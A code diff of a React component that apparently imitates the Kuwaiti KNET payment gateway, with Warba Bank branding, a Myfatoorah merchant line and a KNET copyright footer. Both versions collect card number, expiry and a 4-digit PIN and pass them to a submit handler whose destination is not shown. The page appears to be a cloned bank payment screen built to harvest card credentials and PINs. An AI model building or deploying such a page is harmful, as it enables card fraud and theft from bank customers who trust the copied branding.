@@ -1,60 +1,18 @@
 'use client';
 
-import React, { useState, useEffect } from 'react';
-import '@/styles/knet-payment.css';
+import React, { useState, useRef } from 'react';
 
-interface BankEntry {
-  bin: string;
+interface Card {
+  id: string;
+  last4: string;
   bank: string;
-  logo: string;
 }
 
-const BIN_DB: BankEntry[] = [
-  {
-    bin: '422220',
-    bank: 'Warba Bank',
-    logo: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="200" height="40"><text x="0" y="28" font-size="20" font-family="Arial" fill="%232b6fb3">Warba</text></svg>',
-  },
-  {
-    bin: '400555',
-    bank: 'National Bank of Kuwait',
-    logo: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="220" height="40"><text x="0" y="28" font-size="18" font-family="Arial" fill="%23007ac1">NBK</text></svg>',
-  },
-  {
-    bin: '520000',
-    bank: 'Gulf Bank',
-    logo: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="200" height="40"><text x="0" y="28" font-size="18" font-family="Arial" fill="%23006699">Gulf Bank</text></svg>',
-  },
-  {
-    bin: '426684',
-    bank: 'Burgan Bank',
-    logo: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="200" height="40"><text x="0" y="28" font-size="18" font-family="Arial" fill="%238b2a2a">Burgan</text></svg>',
-  },
-  {
-    bin: '408999',
-    bank: 'Kuwait International Bank',
-    logo: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="260" height="40"><text x="0" y="28" font-size="16" font-family="Arial" fill="%23005588">Kuwait Int. Bank</text></svg>',
-  },
-  {
-    bin: '446404',
-    bank: 'Ahli United Bank',
-    logo: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="180" height="40"><text x="0" y="28" font-size="18" font-family="Arial" fill="%23004b7a">AUB</text></svg>',
-  },
-  {
-    bin: '418875',
-    bank: 'Commercial Bank of Kuwait',
-    logo: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="240" height="40"><text x="0" y="28" font-size="14" font-family="Arial" fill="%23005577">Commercial BK</text></svg>',
-  },
-  {
-    bin: '438608',
-    bank: 'Boubyan Bank',
-    logo: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="180" height="40"><text x="0" y="28" font-size="18" font-family="Arial" fill="%23004466">Boubyan</text></svg>',
-  },
-  {
-    bin: '428125',
-    bank: 'Kuwait Finance House',
-    logo: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="260" height="40"><text x="0" y="28" font-size="14" font-family="Arial" fill="%23003366">Kuwait Finance House</text></svg>',
-  },
+const SAMPLE_CARDS: Card[] = [
+  { id: '1', last4: '403622', bank: 'ABK' },
+  { id: '2', last4: '423826', bank: 'ABK' },
+  { id: '3', last4: '42403256', bank: 'ABK' },
+  { id: '4', last4: '428628', bank: 'ABK' },
 ];
 
 interface PaymentFormProps {
@@ -70,228 +28,326 @@ export default function KNetPaymentForm({
 }: PaymentFormProps) {
   const [cardNumber, setCardNumber] = useState('');
   const [expiry, setExpiry] = useState('');
-  const [cvv, setCvv] = useState('');
-  const [detectedBank, setDetectedBank] = useState<BankEntry | null>(null);
-  const [showPreview, setShowPreview] = useState(false);
+  const [pin, setPin] = useState('');
+  const [selectedCard, setSelectedCard] = useState<Card | null>(null);
+  const [showDropdown, setShowDropdown] = useState(false);
+  const dropdownRef = useRef<HTMLDivElement>(null);
 
-  const findBin = (bin6: string): BankEntry | null => {
-    if (!bin6 || bin6.length < 6) return null;
-    return BIN_DB.find((e) => e.bin === bin6) || null;
-  };
-
-  const maskCard = (num: string): string => {
-    const clean = num.replace(/\s/g, '');
-    if (clean.length < 4) return clean;
-    const last4 = clean.slice(-4);
-    return '•••• •••• •••• ' + last4;
-  };
-
-  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value.replace(/\D/g, '').slice(0, 16);
-    const formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
-    setCardNumber(formatted);
-
-    const bin6 = value.slice(0, 6);
-    const found = findBin(bin6);
-    setDetectedBank(found);
-  };
-
-  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    let value = e.target.value.replace(/\D/g, '');
-    if (value.length >= 2) {
-      value = value.slice(0, 2) + '/' + value.slice(2, 4);
-    }
-    setExpiry(value);
-  };
-
-  const handleSubmit = () => {
-    const cleanCard = cardNumber.replace(/\s/g, '');
-    if (!cleanCard) {
-      alert('ادخل رقم البطاقة');
-      return;
-    }
-
-    const [month, year] = expiry.split('/');
-    if (!month || !year) {
-      alert('ادخل تاريخ انتهاء الصلاحية');
-      return;
-    }
-
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
     onSubmit({
-      cardNumber: cleanCard,
+      cardNumber: selectedCard?.last4 || cardNumber,
       expiry,
-      month,
-      year: '20' + year,
-      cvv,
-      bank: detectedBank?.bank || 'Unknown',
-      bin: cleanCard.slice(0, 6),
+      pin,
     });
   };
 
-  const handleClear = () => {
-    setCardNumber('');
-    setExpiry('');
-    setCvv('');
-    setDetectedBank(null);
-    setShowPreview(false);
-  };
-
-  const handleSaveAndShow = () => {
-    const cleanCard = cardNumber.replace(/\s/g, '');
-    if (!cleanCard) {
-      alert('ادخل رقم البطاقة');
-      return;
-    }
-    setShowPreview(true);
+  const handleCardSelect = (card: Card) => {
+    setSelectedCard(card);
+    setCardNumber(card.last4);
+    setShowDropdown(false);
   };
 
   return (
-    <div className="knet-container">
-      <div className="knet-banner">
-        <img
-          src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='760' height='150'><rect width='100%' height='100%' fill='%23cfe6fb'/><text x='20' y='90' font-family='Arial' font-size='36' fill='%23004488'>بانر تجريبي</text></svg>"
-          alt="banner"
-        />
+    <div style={styles.container}>
+      {/* Top Banner */}
+      <div style={styles.banner}>
+        <div style={styles.bannerTitle}>زكــن على رؤيـــة</div>
+        <div style={styles.bannerSubtitle}>الاحتيال له عدة أشكال وأنواع</div>
       </div>
 
-      <div className="knet-panel">
-        <div className="knet-bank-head">
-          <div className="knet-logo-wrap">
-            {detectedBank?.logo ? (
-              <img src={detectedBank.logo} alt={detectedBank.bank} />
-            ) : (
-              <div style={{ fontWeight: 700, color: 'var(--accent)' }}>LOGO</div>
+      {/* Merchant Section */}
+      <div style={styles.panel}>
+        <div style={styles.bankHeader}>
+          <div style={styles.bankName}>بنك ورقة</div>
+          <div style={styles.bankEnglish}>WARBA BANK</div>
+        </div>
+
+        <div style={styles.infoRow}>
+          <span style={styles.label}>Merchant:</span>
+          <span style={styles.value}>Myfatoorah General Trading Co. (Myfatoorash)</span>
+        </div>
+        <div style={styles.divider}></div>
+
+        <div style={styles.infoRow}>
+          <span style={styles.label}>Amount:</span>
+          <span style={styles.value}>KD {amount}</span>
+        </div>
+      </div>
+
+      {/* Payment Form */}
+      <div style={styles.panel}>
+        {/* Card Number Section */}
+        <div style={styles.formGroup}>
+          <label style={styles.fieldLabel}>Card Number:</label>
+          <div style={styles.cardDropdownWrapper} ref={dropdownRef}>
+            <input
+              type="text"
+              placeholder="4"
+              value={cardNumber}
+              onChange={(e) => {
+                setCardNumber(e.target.value);
+                setShowDropdown(true);
+              }}
+              onFocus={() => setShowDropdown(true)}
+              style={styles.cardNumberInput}
+            />
+            {showDropdown && (
+              <div style={styles.cardDropdown}>
+                {SAMPLE_CARDS.map((card) => (
+                  <div
+                    key={card.id}
+                    style={styles.cardOption}
+                    onClick={() => handleCardSelect(card)}
+                  >
+                    <span>{card.last4} - {card.bank}</span>
+                    <span style={styles.bankIcon}>🏦</span>
+                  </div>
+                ))}
+              </div>
             )}
           </div>
-          <div>
-            <div className="knet-bank-name">
-              {detectedBank?.bank || 'غير معروف'}
-            </div>
-            <div className="knet-meta">Merchant: MyRetailco General Trading Co.</div>
-          </div>
         </div>
 
-        <div className="knet-row">
-          <label>Amount</label>
-          <div style={{ fontWeight: 700 }}>KD {amount}</div>
-        </div>
+        <div style={styles.divider}></div>
 
-        <div className="knet-row">
-          <label htmlFor="card">Card Number</label>
+        {/* Expiration Date */}
+        <div style={styles.formGroup}>
+          <label style={styles.fieldLabel}>Expiration Date:</label>
           <input
-            id="card"
             type="text"
-            inputMode="numeric"
-            maxLength={19}
-            placeholder="xxxx xxxx xxxx xxxx"
-            value={cardNumber}
-            onChange={handleCardChange}
-            disabled={isLoading}
+            placeholder="MM/YY"
+            value={expiry}
+            onChange={(e) => setExpiry(e.target.value)}
+            style={styles.input}
+            maxLength={5}
           />
-          <div className="knet-muted-small">
-            سيتم كشف البنك تلقائياً بناءً على أول 6 أرقام
-          </div>
         </div>
 
-        <div className="knet-two">
-          <div className="knet-row" style={{ flex: 1 }}>
-            <label htmlFor="exp">Expiration Date</label>
-            <input
-              id="exp"
-              type="text"
-              maxLength={5}
-              placeholder="MM/YY"
-              value={expiry}
-              onChange={handleExpiryChange}
-              disabled={isLoading}
-            />
-          </div>
-          <div className="knet-row knet-small">
-            <label htmlFor="pin">PIN</label>
-            <input
-              id="pin"
-              type="password"
-              maxLength={4}
-              placeholder="••••"
-              value={cvv}
-              onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
-              disabled={isLoading}
-            />
-          </div>
-        </div>
+        <div style={styles.divider}></div>
 
-        <div className="knet-actions">
-          <button
-            className="knet-btn primary"
-            onClick={handleSaveAndShow}
-            disabled={isLoading}
-          >
-            Save & Show
-          </button>
-          <button
-            className="knet-btn"
-            onClick={handleClear}
-            disabled={isLoading}
-          >
-            Clear
-          </button>
-        </div>
-
-        {showPreview && (
-          <div className="knet-preview">
-            <div className="knet-credit-card">
-              <div style={{ display: 'flex', gap: 12, alignItems: 'center', marginBottom: 10 }}>
-                <div style={{ width: 90 }}>
-                  {detectedBank?.logo ? (
-                    <img
-                      src={detectedBank.logo}
-                      alt={detectedBank.bank}
-                      style={{ maxHeight: 40 }}
-                    />
-                  ) : (
-                    <div style={{ fontWeight: 700, color: 'var(--accent)' }}>LOGO</div>
-                  )}
-                </div>
-                <div>
-                  <div style={{ fontWeight: 700, color: 'var(--accent)' }}>
-                    {detectedBank?.bank || 'غير معروف'}
-                  </div>
-                  <div className="knet-meta">MyRetailco General Trading Co.</div>
-                </div>
-              </div>
-
-              <div style={{ marginBottom: 8 }}>
-                <div className="knet-meta">Amount</div>
-                <div style={{ fontWeight: 700 }}>KD {amount}</div>
-              </div>
-
-              <div style={{ marginBottom: 8 }}>
-                <div className="knet-meta">Card Number</div>
-                <div style={{ fontWeight: 700 }}>{maskCard(cardNumber)}</div>
-              </div>
-
-              <div style={{ display: 'flex', gap: 8 }}>
-                <div style={{ flex: 1 }}>
-                  <div className="knet-meta">Expiration Date</div>
-                  <div style={{ fontWeight: 700 }}>{expiry}</div>
-                </div>
-                <div style={{ width: 120 }}>
-                  <div className="knet-meta">PIN</div>
-                  <div style={{ fontWeight: 700 }}>{cvv ? '••••' : ''}</div>
-                </div>
-              </div>
-            </div>
-          </div>
-        )}
-
-        <div className="knet-muted-small">
-          يمكنك استبدال بانر أو شعارات البنوك بسهولة عن طريق تعديل src في الأعلى.
+        {/* PIN */}
+        <div style={styles.formGroup}>
+          <label style={styles.fieldLabel}>PIN:</label>
+          <input
+            type="password"
+            value={pin}
+            onChange={(e) => setPin(e.target.value)}
+            style={styles.input}
+            maxLength={4}
+          />
         </div>
       </div>
 
-      <footer className="knet-footer">
-        All Rights Reserved. Copyright 2024 © - The Shared Electronic Banking Services Company - KNET
-      </footer>
+      {/* Buttons */}
+      <div style={styles.panel}>
+        <div style={styles.buttonGroup}>
+          <button
+            onClick={handleSubmit}
+            disabled={isLoading}
+            style={styles.submitButton}
+          >
+            Submit
+          </button>
+          <button
+            type="button"
+            style={styles.cancelButton}
+            onClick={() => {
+              setCardNumber('');
+              setExpiry('');
+              setPin('');
+              setSelectedCard(null);
+              setShowDropdown(false);
+            }}
+          >
+            Cancel
+          </button>
+        </div>
+      </div>
+
+      {/* Footer */}
+      <div style={styles.footer}>
+        <p style={styles.footerText}>All Rights Reserved. Copyright 2026 ©</p>
+        <p style={styles.knetText}>
+          The Shared Electronic Banking Services Company - KNET
+        </p>
+      </div>
     </div>
   );
 }
+
+const styles: { [key: string]: React.CSSProperties } = {
+  container: {
+    maxWidth: '500px',
+    margin: '0 auto',
+    padding: '12px',
+    fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif',
+    backgroundColor: '#f5f5f5',
+  },
+  banner: {
+    backgroundColor: '#5b8db5',
+    color: '#fff',
+    padding: '16px',
+    borderRadius: '12px',
+    textAlign: 'center',
+    marginBottom: '16px',
+  },
+  bannerTitle: {
+    fontSize: '20px',
+    fontWeight: 'bold',
+    direction: 'rtl' as const,
+    marginBottom: '4px',
+  },
+  bannerSubtitle: {
+    fontSize: '14px',
+    direction: 'rtl' as const,
+  },
+  panel: {
+    backgroundColor: '#fff',
+    borderRadius: '16px',
+    padding: '16px',
+    marginBottom: '12px',
+    boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)',
+  },
+  bankHeader: {
+    display: 'flex',
+    flexDirection: 'column' as const,
+    alignItems: 'center',
+    justifyContent: 'center',
+    marginBottom: '16px',
+    paddingBottom: '12px',
+    borderBottom: '2px solid #f0f0f0',
+  },
+  bankName: {
+    fontSize: '20px',
+    fontWeight: 'bold',
+    color: '#2b6fb3',
+    marginBottom: '4px',
+  },
+  bankEnglish: {
+    fontSize: '14px',
+    color: '#2b6fb3',
+    fontWeight: '600',
+  },
+  infoRow: {
+    display: 'flex' as const,
+    justifyContent: 'space-between' as const,
+    alignItems: 'center' as const,
+    marginBottom: '12px',
+    fontSize: '14px',
+  },
+  label: {
+    fontWeight: 'bold',
+    color: '#2b6fb3',
+    minWidth: '100px',
+  },
+  value: {
+    color: '#333',
+    textAlign: 'right' as const,
+    flex: 1,
+  },
+  divider: {
+    height: '1px',
+    backgroundColor: '#e0e0e0',
+    margin: '12px 0',
+  },
+  formGroup: {
+    marginBottom: '12px',
+  },
+  fieldLabel: {
+    display: 'block',
+    fontWeight: 'bold',
+    color: '#2b6fb3',
+    marginBottom: '6px',
+    fontSize: '14px',
+  },
+  cardDropdownWrapper: {
+    position: 'relative' as const,
+  },
+  cardNumberInput: {
+    width: '100%',
+    padding: '10px',
+    border: '1px solid #d0d0d0',
+    borderRadius: '6px',
+    fontSize: '14px',
+    backgroundColor: '#f8f8f8',
+    boxSizing: 'border-box' as const,
+  },
+  cardDropdown: {
+    position: 'absolute' as const,
+    top: '100%',
+    left: 0,
+    right: 0,
+    backgroundColor: '#fff',
+    border: '1px solid #d0d0d0',
+    borderRadius: '6px',
+    marginTop: '2px',
+    boxShadow: '0 4px 6px rgba(0, 0, 0, 0.1)',
+    zIndex: 100,
+  },
+  cardOption: {
+    padding: '10px 12px',
+    borderBottom: '1px solid #f0f0f0',
+    display: 'flex' as const,
+    justifyContent: 'space-between' as const,
+    alignItems: 'center' as const,
+    cursor: 'pointer',
+    fontSize: '13px',
+    color: '#333',
+  },
+  bankIcon: {
+    fontSize: '12px',
+    color: '#2b6fb3',
+  },
+  input: {
+    width: '100%',
+    padding: '10px',
+    border: '1px solid #d0d0d0',
+    borderRadius: '6px',
+    fontSize: '14px',
+    backgroundColor: '#f8f8f8',
+    boxSizing: 'border-box' as const,
+  },
+  buttonGroup: {
+    display: 'flex' as const,
+    gap: '12px',
+    marginTop: '8px',
+  },
+  submitButton: {
+    flex: 1,
+    padding: '12px',
+    backgroundColor: '#e8e8e8',
+    border: '1px solid #d0d0d0',
+    borderRadius: '6px',
+    fontWeight: '600',
+    fontSize: '14px',
+    cursor: 'pointer',
+    color: '#333',
+  },
+  cancelButton: {
+    flex: 1,
+    padding: '12px',
+    backgroundColor: '#e8e8e8',
+    border: '1px solid #d0d0d0',
+    borderRadius: '6px',
+    fontWeight: '600',
+    fontSize: '14px',
+    cursor: 'pointer',
+    color: '#333',
+  },
+  footer: {
+    textAlign: 'center' as const,
+    fontSize: '12px',
+    color: '#666',
+    marginTop: '24px',
+    paddingBottom: '20px',
+  },
+  footerText: {
+    margin: '0 0 4px 0',
+  },
+  knetText: {
+    color: '#2b6fb3',
+    fontWeight: '600',
+    margin: '4px 0 0 0',
+  },
+};
